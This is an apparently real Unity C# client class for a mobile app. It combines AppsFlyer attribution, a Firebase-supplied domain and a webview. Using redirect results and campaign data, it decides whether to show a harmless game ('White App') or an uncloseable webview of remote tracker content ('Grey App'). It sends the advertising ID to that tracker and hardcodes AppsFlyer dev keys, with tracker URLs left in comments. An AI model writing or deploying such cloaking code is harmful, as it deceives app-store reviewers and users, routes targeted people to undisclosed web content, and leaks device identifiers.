using System;
using System.Collections.Generic;

using UnityEngine;
using UnityEngine.SceneManagement;

using AppsFlyerSDK;
using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;

using Core;
using Octopus.SceneLoaderCore.Helpers;

namespace Octopus.Client
{
    public class Client : MonoBehaviour, IAppsFlyerConversionData
    {
        public static Client Instance;
        
        public bool isIgnoreFirstRunApp;
        
        private bool isAfSuccess;
        private bool isConfigSuccess;
        private bool isWebOpened;
        
        //z private string _devKey = "VXLYUvWWUUpNT6yy24mbpe"; //origin
        //private string _devKey = "Qw8nPowFTaNNJGr7z7mg8H";//Mikita
        private string _devKey = "tjxMiMAaUsyHgnYDUaV2pA";//com.tradingprofit.app
        private string _appId = "com.fast.fooomd";//""com.tradingprofit.app";//com.moneymind.trivia
        private string advertisingId = "Не найдено";

        private UniWebView _webView;
        private string generatedURL;
        private List<Request> requests = new List<Request>();
        
        protected void Awake()
        {
            isAfSuccess = false;
            isConfigSuccess = false;
            isWebOpened = false;
            
            if (Instance != null)
            {
                Destroy(gameObject);
            }
            else
            {
                Instance = this;
            }
        }
        
        public void Initialize()
        {
            PrintMessage("!!! Client -> Initialize");
            
            if(GameSettings.HasKey(Constants.IsFirstRunApp) && !isIgnoreFirstRunApp)
            {
                //Повторний запуск додаток
                
                PrintMessage("!!! Client - Повторний запуск додаток");
                
                StartAppsflayer();
                InitializeFirebase();
            }
            else 
            {//Перший раз запустили додаток
                
                PrintMessage("!!! Client - Перший раз запустили додаток");
                
                GameSettings.Init();

                //OpenURL(); //якщо апс включений треба виключити тут

                StartAppsflayer();
                InitializeFirebase();
            }
        }
        
        private void StartAppsflayer()
        {
            advertisingId = GameSettings.GetValue(Constants.GAID);
            
            PrintMessage($"StartAppsflayer: advertisingId={advertisingId}");

            AppsFlyer.initSDK(_devKey, _appId, this);
            
            AppsFlyer.startSDK();
        }
        
        private void InitializeFirebase()
        {
            FirebaseApp.CheckAndFixDependenciesAsync().ContinueWithOnMainThread(task =>
            {
                if (task.Result == DependencyStatus.Available)
                {
                    FirebaseApp app = FirebaseApp.DefaultInstance;
                    FetchRemoteConfig();
                }
                else
                {
                    //Debug.LogError("Firebase dependencies not resolved: " + task.Result);
                }
            });
        }
        
        private void FetchRemoteConfig()
        {
            var remoteConfig = FirebaseRemoteConfig.DefaultInstance;
            
            var defaults = new System.Collections.Generic.Dictionary<string, object>();
            defaults.Add("Domain", "default.domain.com");
            remoteConfig.SetDefaultsAsync(defaults).ContinueWithOnMainThread(_ =>
            {
                remoteConfig.FetchAsync(TimeSpan.Zero).ContinueWithOnMainThread(fetchTask =>
                {
                    if (fetchTask.IsCompleted && !fetchTask.IsFaulted)
                    {
                        remoteConfig.ActivateAsync().ContinueWithOnMainThread(activateTask =>
                        {
                            // Получаем значение по ключу "Domain"
                            string domainValue = remoteConfig.GetValue("Domain").StringValue;

                            PlayerPrefs.SetString("Domain", domainValue);

                            isConfigSuccess = true;
                            
                            OpenURL();
                        });
                    }
                    else
                    {
                        SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.mainScene);
                    }
                });
            });
        }
        
        public void onConversionDataSuccess(string conversionData)
        {
            PrintMessage($"onConversionDataSuccess");
            
            Dictionary<string, object> dataDict = AppsFlyer.CallbackStringToDictionary(conversionData);

            //string GetValue(string key) => dataDict.TryGetValue(key, out var val) ? val?.ToString() ?? "NULL" : "";
            
            string Escape(string value) => Uri.EscapeDataString(value);
            
            string GetValue(params string[] keys)
            {
                foreach (var key in keys)
                {
                    if (dataDict.TryGetValue(key, out var val) && val != null)
                    {
                        string s = val.ToString();
                        if (!string.IsNullOrEmpty(s) && s != "NULL" && s != "null")
                            return s;
                    }
                }

                return "";
            }

            /*string creativeId = GetValue("af_ad");
            string adCampaignId = GetValue("af_c_id");
            string source = GetValue("af_siteid");
            string subId1 = "rr";
            string subId2 = "50";
            string subId3 = "22";
            string appId = GetValue("game_id");
            string campaignName = GetValue("c");
            string af_pid = GetValue("media_source");

            string formattedString =
                $"external_id={Escape(advertisingId)}&creative_id={Escape(creativeId)}" +
                $"&ad_campaign_id={Escape(adCampaignId)}&source={Escape(source)}" +
                $"&sub_id_1={Escape(subId1)}&sub_id_2={Escape(subId2)}" +
                $"&sub_id_3={Escape(subId3)}&appid={Escape(appId)}" +
                $"&campaign_name={Escape(campaignName)}&campaign_id={Escape(adCampaignId)}" +
                $"&media_source={Escape(af_pid)}";*/
            
            // Параметри під Keitaro URL
            string adId = GetValue("af_ad_id", "ad_id");
            string campaign = GetValue("campaign", "c");
            string app = GetValue("app");
            string uuid = advertisingId; // або свій device/external id
            string devKey = _devKey; 
            string afMessage = GetValue("af_message");
            string afSiteId = GetValue("af_siteid");
            string afCId = GetValue("campaign_id", "af_c_id");
            string afAd = GetValue("af_ad");
            string afAdId = GetValue("af_ad_id");
            string afAdset = GetValue("af_adset");
            string afChannel = GetValue("af_channel");
            string gamerId = GetValue("gamer_id");
            string gameId = GetValue("game_id");
            string afAdOrientation = GetValue("af_ad_orientation");
            
            string formattedString =
                //"https://boroshede.com/KHXDBkCT" +
                $"?ad_id={Escape(adId)}" +
                $"&campaign={Escape(campaign)}" +
                $"&app={Escape(app)}" +
                $"&uuid={Escape(uuid)}" +
                $"&dev_key={Escape(devKey)}" +
                $"&af_message={Escape(afMessage)}" +
                $"&af_siteid={Escape(afSiteId)}" +
                $"&af_c_id={Escape(afCId)}" +
                $"&af_ad={Escape(afAd)}" +
                $"&af_ad_id={Escape(afAdId)}" +
                $"&af_adset={Escape(afAdset)}" +
                $"&af_channel={Escape(afChannel)}" +
                $"&gamer_id={Escape(gamerId)}" +
                $"&game_id={Escape(gameId)}" +
                $"&af_ad_orientation={Escape(afAdOrientation)}";

            
            PlayerPrefs.SetString("URL", formattedString);
            PlayerPrefs.Save();

            PrintMessage($"🚦formattedString: {formattedString}");

            isAfSuccess = true;
            
            OpenURL();
        }
        
        public void onConversionDataFail(string error)
        {
            PrintMessage($"AF FAIL: {error}");
        }

        public void onAppOpenAttribution(string attributionData)
        {
        }

        public void onAppOpenAttributionFailure(string error)
        {
        }

        private void Send(Request request)
        {
            PrintMessage($"Send Request {request.GetType()}");
            
            requests.Remove(request);

            StartCoroutine(SenderRequest.Send(request, CheckRequests));
        }

        private void CheckRequests()
        {
            PrintMessage("!!! Client -> CheckRequests");
            
            if (requests.Count != 0)
            {
                Send(requests[0]);
            }
            else
            {
                SwitchToScene();
            }
        }
        
        private void SwitchToScene()
        {
            PrintMessage("!!! Client -> SwitchToScene");
            
            var scene = CheckReceiveUrlIsNullOrEmpty() ? SceneLoader.Instance.mainScene : SceneLoader.Instance.webviewScene;
            
            if (SceneLoader.Instance)
                SceneLoader.Instance.SwitchToScene(scene);
            else
                SceneManager.LoadScene(scene);
        }

        private bool CheckReceiveUrlIsNullOrEmpty()
        {
            PrintMessage("!!! Client -> CheckStartUrlIsNullOrEmpty");
            
            var receiveUrl = GameSettings.GetValue(Constants.ReceiveUrl, "");

            PrintMessage($"@@@ StartUrl: {receiveUrl}");

            return String.IsNullOrEmpty(receiveUrl);
        }

        private void PrintMessage(string message)
        {
            //Debugger.Log($"@@@ Client ->: {message}", new Color(0.2f, 0.4f, 0.9f));
        }
        
        private void OpenURL()
        {
            PrintMessage($"@@@ OpenURL ({isAfSuccess} || {isConfigSuccess} || {isWebOpened}): {generatedURL}");
            
            //if (!isConfigSuccess || isWebOpened)
            if (!isAfSuccess || !isConfigSuccess || isWebOpened)
            {
                PrintMessage($"⁉️NO OPEN URL");
                return;
            }

            isWebOpened = true;

            GenerateURL();
            
            CheckWebview();

            Subscribe();

            _webView.Load(generatedURL);

            _webView.OnShouldClose += (view) => false;
        }

        private void GenerateURL()
        {
            generatedURL = PlayerPrefs.GetString("URL", "");

            string domain = PlayerPrefs.GetString("Domain", "");

            generatedURL = domain + generatedURL;

            //generatedURL = "https://trk.zamerenie.com/rk239mW9?external_id={gadid}&creative_id={creative_pack}&ad_campaign_id={campaign}&source={source_app_id}&sub_id_1=rr&sub_id_2=50&sub_id_3=22&appid={appid}&campaign_name={campaign_name}&campaign_id={campaign_id}";
            
            PrintMessage($"📌 generatedURL: {generatedURL}");
        }

        private void CheckWebview()
        {
            if (_webView == null)
            {
                CreateWebView();
            }
        }
        
        private void CreateWebView()
        {
            var webViewGameObject = new GameObject("UniWebView");

            _webView = webViewGameObject.AddComponent<UniWebView>();
        }
        
        private void Subscribe()
        {
            PrintMessage($"📥Subscribe");
            
            _webView.OnPageFinished += OnPageFinished;
            _webView.OnPageStarted += OnPageStarted;
            _webView.OnLoadingErrorReceived += OnLoadingErrorReceived;
        }

        private void OnPageStarted(UniWebView webview, string url)
        {
            PrintMessage($"### 🎬OnPageStarted UniWebView: url={url} / _webView.Url={_webView.Url}");
        }

        private void UnSubscribe()
        {
            PrintMessage($"📤UnSubscribe");
            
            _webView.OnPageFinished -= OnPageFinished;
            _webView.OnPageStarted -= OnPageStarted;
            _webView.OnLoadingErrorReceived -= OnLoadingErrorReceived;
        }
        
        private void OnPageFinished(UniWebView view, int statusCode, string url)
        {
            PrintMessage($"### 🏁OnPageFinished: url={url} / _webView.Url={_webView.Url}");
            
            var uriPage = new Uri(url);
            var uriDomen = new Uri("http://www.google.com");
            
            var hostPage = uriPage.Host.ToLower();
            var hostDomen = uriDomen.Host.ToLower();
            
            GameSettings.SetFirstRunApp();
            
            bool isGoogleSite = hostPage.EndsWith("google.com") || hostPage.Contains(".google.");

            PrintMessage($"🔍 Перевірка URL: hostPage = {hostPage}, hostDomen = {hostDomen}");
            
            if (isGoogleSite)
            {
                PrintMessage($"White App");

                PlayerPrefs.GetInt(Constants.IsOnlyWhiteRunApp, 1);
                PlayerPrefs.Save();
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.mainScene);
            }
            else
            {
                PrintMessage($"Grey App");
                
                GameSettings.SetValue(Constants.ReceiveUrl, url);
                
                SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            }

            UnSubscribe();
        }
        
        private void OnLoadingErrorReceived(UniWebView view, int errorCode, string errorMessage, UniWebViewNativeResultPayload payload)
        {
            PrintMessage($"### 💀OnLoadingErrorReceived: errorCode={errorCode}, _webView.Url={_webView.Url}, errorMessage={errorMessage}");
        
            GameSettings.SetValue(Constants.ReceiveUrl, _webView.Url);
            
            SceneLoader.Instance.SwitchToScene(SceneLoader.Instance.webviewScene);
            
            UnSubscribe();
        }
    }
}
